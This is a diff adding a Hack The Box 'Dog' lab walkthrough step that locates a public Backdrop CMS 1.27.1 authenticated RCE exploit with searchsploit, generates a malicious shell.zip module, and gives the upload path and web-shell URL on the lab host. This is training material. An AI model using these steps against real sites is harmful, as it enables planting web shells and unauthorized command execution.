@@ -185,3 +185,58 @@ Access to update.php | Protected | ✅ Mitigates RCE from unauthorized access
 File System | Writable (public download method) | ⚠️ Writable FS may allow file upload exploitation
 
 ![Version](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss10.png?raw=true)
+
+🔍 10 .Exploiting Backdrop CMS v1.27.1 - Authenticated RCE
+
+Using searchsploit, an exploit was found for Backdrop CMS v1.27.1 that allows Authenticated Remote Command Execution (RCE).
+
+Commands and Output:
+
+┌──(root㉿kali)-[/home/kali/htb/dog]
+└─# searchsploit backdrop cms 1.27.1    
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)                                                                                                                                        | php/webapps/52021.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Downloaded the exploit:
+
+┌──(root㉿kali)-[/home/kali/htb/dog]
+└─# searchsploit -m php/webapps/52021.py
+
+  Exploit: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)
+      URL: https://www.exploit-db.com/exploits/52021
+     Path: /usr/share/exploitdb/exploits/php/webapps/52021.py
+    Codes: N/A
+ Verified: True
+File Type: Python script, Unicode text, UTF-8 text executable
+cp: overwrite '/home/kali/htb/dog/52021.py'? 
+Copied to: /home/kali/htb/dog/52021.py
+
+File listing confirms the exploit script was saved:
+
+┌──(root㉿kali)-[/home/kali/htb/dog]
+└─# ls                                  
+10.10.11.58  52021.py  dog.txt  ffuf_results.txt  GitDump  git.sh  GitTools  output
+
+Executed the exploit to generate a malicious module:
+
+┌──(root㉿kali)-[/home/kali/htb/dog]
+└─# python3 52021.py http://10.10.11.58       
+Backdrop CMS 1.27.1 - Remote Command Execution Exploit
+Evil module generating...
+Evil module generated! shell.zip
+Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
+Your shell address: http://10.10.11.58/modules/shell/shell.php
+
+Next Steps:
+
+    Upload shell.zip via /admin/modules/install
+
+    Trigger RCE by accessing:
+    http://10.10.11.58/modules/shell/shell.php
+
+![Shell](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss12.png?raw=true)
